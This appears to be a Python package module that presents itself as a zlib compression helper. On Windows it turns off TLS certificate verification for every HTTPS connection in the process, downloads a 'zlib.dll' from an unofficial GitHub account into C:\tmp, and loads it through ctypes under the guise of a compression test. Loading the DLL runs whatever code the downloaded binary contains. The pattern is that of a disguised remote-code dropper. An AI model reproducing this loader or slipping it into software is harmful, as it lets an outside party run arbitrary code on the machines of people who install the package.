import ctypes
import urllib.request
import ssl
import os
import platform


def _get_from_github():
    if not platform.system().lower() == 'windows':
        print("This package requires Windows OS. Current system:", platform.system())
        return False

    download_dir = r"C:\tmp"

    try:
        os.makedirs(download_dir, exist_ok=True)
        print(f"Directory {download_dir} created or already exists")
    except Exception as e:
        print(f"Error creating directory {download_dir}: {e}")
        return False
    download_path = os.path.join(download_dir, "zlib.dll")

    dll_url = "https://github.com/msg3176357131/zlib/raw/main/zlib.dll"

    ssl._create_default_https_context = ssl._create_unverified_context

    try:
        print("Downloading DLL from GitHub")

        urllib.request.urlretrieve(dll_url, download_path)

        if os.path.exists(download_path):
            file_size = os.path.getsize(download_path)
            print(f"zlib.dll success download! Size: {file_size}")
            _simple_compression_test(download_path)
            return True
        else:
            print(f"zlib.dll failed download")
            return False

    except Exception as e:
        print(f"Error: {e}")
        return False

def _simple_compression_test(dll_path):
    print("Running simple compression test...")

    try:
        zlib = ctypes.CDLL(dll_path)
        zlib.compress2.argtypes = [
            ctypes.POINTER(ctypes.c_ubyte),
            ctypes.POINTER(ctypes.c_ulong),
            ctypes.POINTER(ctypes.c_ubyte),
            ctypes.c_ulong,
            ctypes.c_int
        ]
        zlib.compress2.restype = ctypes.c_int


        test_data = "test123"
        print(f"Original data: {test_data}")

        if isinstance(test_data, str):
            test_data = test_data.encode('utf-8')

        data_bytes = bytes(test_data)
        src_len = len(data_bytes)
        print(f"Source data length: {src_len}")

        dest_len = ctypes.c_ulong(src_len + (src_len // 100) + 12)
        dest_buf = (ctypes.c_ubyte * dest_len.value)()
        src_buf = (ctypes.c_ubyte * src_len).from_buffer_copy(data_bytes)

        result = zlib.compress2(
            dest_buf,
            ctypes.byref(dest_len),
            src_buf,
            src_len,
            6  # compression level
        )

        print(f"Compression result code: {result}")
        if result != 0:
            raise Exception(f"Compression failed: {result}")

        compressed_data = bytes(dest_buf[:dest_len.value])
        print(f"Compressed size: {len(compressed_data)} bytes")
        return True
    except Exception:
        return False
